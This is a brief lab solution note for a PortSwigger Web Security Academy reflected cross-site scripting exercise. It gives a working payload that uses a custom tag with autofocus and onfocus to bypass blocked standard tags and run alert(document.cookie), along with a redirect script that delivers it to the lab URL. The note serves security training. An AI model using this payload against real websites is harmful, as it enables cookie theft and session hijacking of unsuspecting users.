# Lab

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

## Payload

```html
<script>
    window.location="https://0ad400b504628f0481ed9f0400f700cb.web-security-academy.net/?search=%3Cxss%20autofocus%20tabindex=1%20onfocus=alert(document.cookie)%3E%3C/xss%3E";
</script>
```

Url : `https://0ad400b504628f0481ed9f0400f700cb.web-security-academy.net/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>`

Payload : `<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>`